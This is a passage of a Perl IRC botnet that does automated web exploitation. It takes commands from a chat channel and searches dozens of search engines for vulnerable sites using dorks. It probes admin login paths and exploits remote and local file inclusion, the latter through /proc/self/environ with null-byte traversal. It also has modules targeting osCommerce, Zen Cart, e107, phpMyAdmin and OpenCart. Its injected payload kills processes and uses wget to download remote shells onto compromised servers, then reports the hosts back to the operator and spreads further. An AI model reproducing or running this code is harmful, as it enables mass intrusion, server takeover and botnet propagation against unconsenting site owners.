asp','adminpanel.asp','fileadmin/','fileadmin.php','fileadmin.asp','fileadmin.html','administration/','administration.php','administration.html','sysadmin.php','sysadmin.html','phpmyadmin/','myadmin/','sysadmin.asp','sysadmin/','ur-admin.asp','ur-admin.php','ur-admin.html','ur-admin/','Server.php','Server.html','Server.asp','Server/','wp-admin/','administr8.php','administr8.html','administr8/','administr8.asp','webadmin/','webadmin.php','webadmin.asp','webadmin.html','administratie/','admins/','admins.php','admins.asp','admins.html','administrivia/','Database_Administration/','WebAdmin/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cPanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','members/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','admin_area/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','dminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','server/','database_administration/','power_user/','system_administration/','ss_vms_admin_sm/','  --> Finish!!');
						&msg("$path","|15,1(4@9LOGIN15)13 Searching Admin login for 4".$test." |");
						foreach $scan(@index){
						$url = $test.$scan;
						$request = HTTP::Request->new(GET=>$url);
						$useragent = LWP::UserAgent->new();
						$response = $useragent->request($request);
							if ($response->is_success && $response->content =~ /Admin Area/ || $response->content =~ /Password/ || $response->content =~ /welcome/ || $response->content =~ /admin area/ || $response->content =~ /passwd/ || $response->content =~ /username/) { 
							$msg = "9Ok!!|";
                                                        }
							else { $msg = "4forbidden!!|";}
						&msg("$path","|15,1(4@9LOGIN15)13 $url 4$msg |");
						sleep 1;
						}
						}
						exit;
					}
				}

                ##################################################################### RFI SCAN

                if ($msg=~ /^$rficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$rfilogo 9Dork :4 $dork |");
                            &msg("$path","|$rfilogo 13Bugz :4 $bug |");
                            &msg("$path","|$rfilogo 8Scanner Begin ...");
                            &scan_start($path,$bug,$dork,$engine,1);
                        } else {
                            &msg("$path","|[ $nick ] $rfilogo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }

                ##################################################################### LFI SCAN

                if ($msg=~ /^$lficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","|$lfilogo 9Dork :4 $dork |");
                                &msg("$path","|$lfilogo 13Bugz :4 $bug |");
                                &msg("$path","|$lfilogo 8Scanner Begin ...|");
                                &scan_start($path,$bug,$dork,$engine,2);
                            } else {
                                &msg("$path","|[ $nick ] $lfilogo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }

                ##################################################################### e107 SCAN

                if ($msg=~ /^$e107cmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                                my ($bug,$dork) = ("contact.php",$1);
                                &msg("$path","|$e107logo 9Dork :4 $dork |");
                                &msg("$path","|$e107logo 13Bugz :4 $bug |");
                                &msg("$path","|$e107logo 8Scanner Begin ...|");
                                &scan_start($path,$bug,$dork,$engine,3);
                            } else {
                                &msg("$path","|[ $nick ] $e107logo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### XML SCAN
				if ($msg=~ /^$xmlcmd\s+(.*?)\s+(.*)/ ) {
					if (my $pid = fork) {
						waitpid($pid, 0);
					}
					else {
						if (fork) {    exit; } else {
                            if (&isFound($injector,"ipays")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","|$xmllogo 9Dork :4 $dork |");
                                &msg("$path","|$xmllogo 13Bugz :4 $bug |");
                                &msg("$path","|$xmllogo 8Scanner Begin ...|");
                                &scan_start($path,$bug,$dork,$engine,4);
                            } else {
                                &msg("$path","|[ $nick ] $xmllogo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
				
                ##################################################################### SQL SCAN

                if ($msg=~ /^$sqlcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$sqllogo 9Dork :4 $dork |");
                            &msg("$path","|$sqllogo 13Bugz :4 $bug |");
                            &msg("$path","|$sqllogo 8Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,5);
                        }
                        exit;
                    }
                }

                ##################################################################### OSCO SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ("admin/categories.php/login.php",$1);
                            &msg("$path","|$oscologo 9Dork :4 $dork |");
                            &msg("$path","|$oscologo 8Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,6);
                        } else {
                            &msg("$path","|[ $nick ] $oscologo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
                ##################################################################### OSCO2 SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ("admin/file_manager.php/login.php",$1);
                            &scan_start($path,$bug,$dork,$engine,12);
                         } else {
                            &msg("$path","|[ $nick ] $oscologo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }

                ##################################################################### OSCOSQL SCAN

                if ($msg=~ /^$ossqlcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$ossqllogo 9Dork :4 $dork |");
                            &msg("$path","|$ossqllogo 13Bugz :4 $bug |");
                            &msg("$path","|$ossqllogo 8Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,10);
                        }
                        exit;
                    }
                }

                ##################################################################### OSCO3 SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ("admin/banner_manager.php/login.php",$1);
                            &msg("$path","|$oscologo 9Dork :4 $dork |");
                            &msg("$path","|$oscologo 8Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,11);
                        } else {
                            &msg("$path","|[ $nick ] $oscologo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
                ##################################################################### E107SQL SCAN

                if ($msg=~ /^$esqlcmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
			 my ($bug,$dork) = ("contact.php",$1);
                            &msg("$path","|$e107logosql 9Dork :4 $dork |")
                            &msg("$path","|$e107logosql 8Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,13);
                        }
                        exit;
                    }
                }
                ##################################################################### PhpMyAdmin SCAN

                if ($msg=~ /^$admcmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("phpMyAdmin/config/config.inc.php",$1);
                            &msg("$path","|$admlogo 9Dork :4 $dork |");
                            &msg("$path","|$admlogo 8Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,7);
                        }
                        exit;
                    }
                }
                ##################################################################### OPENCART SCAN

                if ($msg=~ /^$opcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$oplogo 9Dork :4 $dork |");
                            &msg("$path","|$oplogo 13Bugz :4 $bug |");
                            &msg("$path","|$oplogo 8Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,8);
                        }
                        exit;
                    }
                }
                ##################################################################### ZEN SCAN

                if ($msg=~ /^$zencmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("admin/sqlpatch.php/password_forgotten.php?action=execute",$1);
                            &msg("$path","|$zenlogo 9Dork :4 $dork |");
                            &msg("$path","|$zenlogo 13Scanner Begin ...|");
                            &scan_start($path,$bug,$dork,$engine,9);
                        }
                        exit;
                    }
                }
                ##################################################################### ZEN SCAN

                if ($msg=~ /^$zencmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("admin/record_company.php",$1);
                            &scan_start($path,$bug,$dork,$engine,9);
                        }
                        exit;
                    }
                }
				##################################################################### THUMB1 SCAN ADDED

                if ($msg=~ /^$thumbcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$thumblogo 9Dork :4 $dork |");
                            &msg("$path","|$thumblogo 13Bugz :4 $bug |");
                            &msg("$path","|$thumblogo 8Scanner Begin ...");
                            &scan_start($path,$bug,$dork,$engine,14);
                        } else {
                            &msg("$path","|[ $nick ] $thumblogo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### THUMB2 SCAN ADDED

                if ($msg=~ /^$thumbcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$thumblogo 9Dork :4 $dork |");
                            &msg("$path","|$thumblogo 13Bugz :4 $bug |");
                            &msg("$path","|$thumblogo 8Scanner Begin ...");
                            &scan_start($path,$bug,$dork,$engine,15);
                        } else {
                            &msg("$path","|[ $nick ] $thumblogo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### THUMB3 SCAN ADDED

                if ($msg=~ /^$thumbcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$thumblogo 9Dork :4 $dork |");
                            &msg("$path","|$thumblogo 13Bugz :4 $bug |");
                            &msg("$path","|$thumblogo 8Scanner Begin ...");
                            &scan_start($path,$bug,$dork,$engine,16);
                        } else {
                            &msg("$path","|[ $nick ] $thumblogo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### ZERO SCAN ADDED

                if ($msg=~ /^$zboardcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$zerologo 9Dork :4 $dork |");
                            &msg("$path","|$zerologo 13Bugz :4 $bug |");
                            &msg("$path","|$zerologo 8Scanner Begin ...");
                            &scan_start($path,$bug,$dork,$engine,17);
                        } else {
                            &msg("$path","|[ $nick ] $zerologo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### ZERO2 SCAN ADDED

                if ($msg=~ /^$zboardcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"ipays")) {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","|$zerologo 9Dork :4 $dork |");
                            &msg("$path","|$zerologo 13Bugz :4 $bug |");
                            &msg("$path","|$zerologo 8Scanner Begin ...");
                            &scan_start($path,$bug,$dork,$engine,18);
                        } else {
                            &msg("$path","|[ $nick ] $zerologo 4PHP Shell Not Working!!!!|");
                            }
                        }
                        exit;
                    }
                }
				#####################################################################
				
				
            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                &parse("$line");
            } else {
                if ($#lines == 0) {
                    &parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    &parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    &parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

#########################################
sub type () {
my ($chan,$bug,$dork,$engine,$type) = @_;
	   if ($type == 1){&rfi($chan,$bug,$dork,$engine);}
	elsif ($type == 2){&lfi($chan,$bug,$dork,$engine);}
	elsif ($type == 3){&e107($chan,$bug,$dork,$engine);}
	elsif ($type == 4){&xml($chan,$bug,$dork,$engine);}
	elsif ($type == 5){&sql($chan,$bug,$dork,$engine);}
	elsif ($type == 6){&osco($chan,$bug,$dork,$engine);}
	elsif ($type == 12){&osco2($chan,$bug,$dork,$engine);}
	elsif ($type == 7){&adm($chan,$bug,$dork,$engine);}
	elsif ($type == 8){&op($chan,$bug,$dork,$engine);}
	elsif ($type == 9){&zen($chan,$bug,$dork,$engine);}
	elsif ($type == 10){&oscoQ($chan,$bug,$dork,$engine);}
	elsif ($type == 11){&osco3($chan,$bug,$dork,$engine);}
	elsif ($type == 13){&e107xpl($chan,$bug,$dork,$engine);}
	elsif ($type == 14){&thumb1($chan,$bug,$dork,$engine);}
	elsif ($type == 15){&thumb2($chan,$bug,$dork,$engine);}
	elsif ($type == 16){&thumb3($chan,$bug,$dork,$engine);}
	elsif ($type == 17){&zero($chan,$bug,$dork,$engine);}
	elsif ($type == 18){&zero2($chan,$bug,$dork,$engine);}
}
sub scan_start() {
my ($chan,$bug,$dork,$engine,$type) = @_;
    if ($engine =~ /google/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGLe",$type);
        } exit; }
    }
	
    if ($engine =~ /google2/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGle2",$type);
        } exit; }
    }
	
    if ($engine =~ /bing/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"Bing",$type);
        } exit; }
    }
	
    if ($engine =~ /altavista/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ALtaViSTa",$type);
        } exit; }
    }
	
    if ($engine =~ /ask/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AsK",$type);
        } exit; }
    }

    if ($engine =~ /uol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"UoL",$type);
        } exit; }
    }

    if ($engine =~ /yahoo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YahOo",$type);
        } exit; }
    }
	
    if ($engine =~ /clusty/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"CluSty",$type);
        } exit; }
    }
	
    if ($engine =~ /gutser/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"GutSer",$type);
        } exit; }
    }
	
    if ($engine =~ /rediff/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ReDiff",$type);
        } exit; }
    }

    if ($engine =~ /virgilio/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"VirgiLio",$type);
        } exit; }
    }

    if ($engine =~ /webde/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"WebDe",$type);
        } exit; }
    }

    if ($engine =~ /exalead/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ExaLead",$type);
        } exit; }
    }
	
    if ($engine =~ /lycos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyCos",$type);
        } exit; }
    }

    if ($engine =~ /hotbot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"HotBot",$type);
        } exit; }
    }

    if ($engine =~ /aol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AoL",$type);
        } exit; }
    }
	
    if ($engine =~ /sapo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SaPo",$type);
        } exit; }
    }
	
    if ($engine =~ /duck/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"DuCk",$type);
        } exit; }
    }

    if ($engine =~ /lygo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyGo",$type);
        } exit; }
    }

    if ($engine =~ /yause/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YauSe",$type);
        } exit; }
    }

    if ($engine =~ /baidu/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BaiDu",$type);
        } exit; }
    }

    if ($engine =~ /kipot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"KiPoT",$type);
        } exit; }
    }

    if ($engine =~ /gibla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GiBLa",$type);
        } exit; }
    }

    if ($engine =~ /black/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BLacK",$type);
        } exit; }
    }

	if ($engine =~ /onet/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"oNeT",$type);
        } exit; }
    }

	if ($engine =~ /sizuka/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SiZuka",$type);
        } exit; }
    }

	if ($engine =~ /walla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"WaLLa",$type);
        } exit; }
    }

	if ($engine =~ /demos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"DeMos",$type);
        } exit; }
    }

	if ($engine =~ /rose/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"RoSe",$type);
        } exit; }
    }

	if ($engine =~ /seznam/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SeZnaM",$type);
        } exit; }
    }

	if ($engine =~ /tiscali/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"TisCali",$type);
        } exit; }
    }

	if ($engine =~ /naver/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"NaVeR",$type);
        } exit; }
   }
	if ($engine =~ /live/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"live",$type);
        } exit; }
    }
	
	if ($engine =~ /rakuten/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"rakuten",$type);
        } exit; }
    }
	
	if ($engine =~ /biglobe/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"biglobe",$type);
        } exit; }
    }
	
	if ($engine =~ /nova/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"nova",$type);
        } exit; }
    }
	
	if ($engine =~ /najdi/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"najdi",$type);
        } exit; }
    }
	
	if ($engine =~ /goo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"goo",$type);
        } exit; }
    }
	
	if ($engine =~ /uksubmit/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"uksubmit",$type);
        } exit; }
    }
	
	if ($engine =~ /excite/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"excite",$type);
        } exit; }
    }
	
	if ($engine =~ /amidalla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"amidalla",$type);
        } exit; }
    }
	
	if ($engine =~ /buscar/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"buscar",$type);
        } exit; }
    }
	
	if ($engine =~ /sogou/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"sogou",$type);
        } exit; }
    }
	
	if ($engine =~ /interia/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"interia",$type);
        } exit; }
    }
	
	if ($engine =~ /snz/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"snz",$type);
        } exit; }
    }
	
	if ($engine =~ /yandex/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"yandex",$type);
        } exit; }
    }
	
	if ($engine =~ /joeant/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"joeant",$type);
        } exit; }
    }
	
	if ($engine =~ /terra/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"terra",$type);
        } exit; }
    }
		if ($engine =~ /youdao/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"youdao",$type);
        } exit; }
    }
	
	if ($engine =~ /amfibi/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"amfibi",$type);
        } exit; }
    }
	
	if ($engine =~ /bigclique/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"bigclique",$type);
        } exit; }
    }
	
	if ($engine =~ /dancefloor/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"dancefloor",$type);
        } exit; }
    }
}

#########################################

sub rfi() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$rfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
				if ($count == $num-1) { &msg("$chan","|$rfilogo(0+4$engine15)10 Scan finish|"); }
				my $coba = "http://".$site.$bug."test??";
				my $test = "http://".$site.$bug.$injector."??";
				my $dor  = "http://".$site.$bug.$botshell."??";
				my $dor2  = "http://".$site.$bug.$botshell2."??";
				my $cek  = &get_content($coba);sleep(1);
				&get_content($dor);sleep(1);
				&get_content($dor2);sleep(1);
				if ($cek =~ /failed to open stream/i) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					&rfi_xpl($test,$chan,$site);
					exit;}
					}
				}
		}
	}
}

sub rfi_xpl() {
my $url    = $_[0];
my $chan   = $_[1];
my $site   = $_[2];
my $dor  = $url.$botshell."??";
my $dor2  = $url.$botshell2."??";
my $test = $url.$injector."??";
my $vuln = $url."14(gCyber)|";
my $check = &get_content($test);
            &get_content($dor);sleep(1);
            &get_content($dor2);sleep(1);
	if ( $check =~ /Faldy sHeLL/i ) {
	my $safe   ="";
	my $os 	   ="";
	my $free   ="";
    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
		&msg("$chan","|$rfilogo(0+8VuLn15)13 ".$vuln."9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)(0+9safemode-off15)|");
		&msg("$admin","$rfilogo(0+8VuLn15)13 ".$vuln."9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");
		&msg("$chan","|$rfilogo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");
	        }
                else {&msg("$chan","|$rfilogo(0+8VuLn15)10 ".$vuln." (4@7safemode-on15)|");}
}

sub lfi() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$lfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$lfilogo(0+4$engine15)10 Scan finish|"); }
            my $dir = "../../../../../../../../../../../../../";
            my $test = "http://".$site.$bug.$dir."/proc/self/environ%0000";
            my $vuln = "http://".$site."12".$bug.$dir."/proc/self/environ%0000";
            my $shell = "http://".$site."12".$bug.$dir."/tmp/gCyber%0000";
            my $html = &get_content($test);
            if ($html =~ /DOCUMENT_ROOT=\// && $html =~ /HTTP_USER_AGENT/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $code = 'echo "c0li#".php_uname()."#c0li".get_current_user();if(@copy("'.$injector.'","/tmp/gCyber")) { echo "SUCCESS";@copy("'.$botshell.'","/tmp/dev");@copy("'.$botshell2.'","/tmp/linux"); }';
                    my $res = lfi_env_query($test,encode_base64($code));
				    &lfi_spread_query($test);
				    &get_content("http://".$site.$bug.$dir."/tmp/dev%0000");
				    &get_content("http://".$site.$bug.$dir."/tmp/maza%0000");
                    $res =~ s/\n//g;
                    if ($res =~ /c0li#(.*)#c0li(.*)SUCCESS/sg) {
                        my $sys = $1;
						$nob0dy = $2;
                        &msg("$chan","|$lfilogo(0+4$engine15)15(0+8SHeLL15)13 ".$shell." 15(4@9".$sys."15))15(4@9$nob0dy15)|");sleep(2);
                    }
                    elsif ($res =~ /c0li#(.*)#c0li(.*)/sg) {
                        if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                            my $sys = $1;
			    $nob0dy = $2;
                            my $upload = 'system("killall -9 perl;killall -9 php;wget '.$injector.' -O picture.php;fetch '.$injector.';mv linux.jpg picture.php;wget '.$botshell.' -O input.php;fetch '.$botshell.';mv input.jpg input.php;wget '.$botshell2.' -O output.php;fetch '.$botshell2.';mv output.jpg output.php;");passthru("killall -9 perl;killall -9 php;wget '.$injector.' -O picture.php;fetch '.$injector.';mv linux.jpg picture.php;wget '.$botshell.' -O input.php;fetch '.$botshell.';mv input.jpg input.php;wget '.$botshell2.' -O output.php;fetch '.$botshell2.';mv output.jpg output.php;");';
                            my $wget = lfi_env_query($test,encode_base64($upload)); sleep(2);
                            my $check = &get_content("http://".$site.$bug.$dir."/tmp/Faldy%0000"); sleep(2);
					&get_content("http://".$site.$bug.$dir."/tmp/dev%0000");sleep(2);
					&get_content("http://".$site.$bug.$dir."/tmp/linux%0000");sleep(2);
                            if ($check =~ /Faldy sHeLL/) {
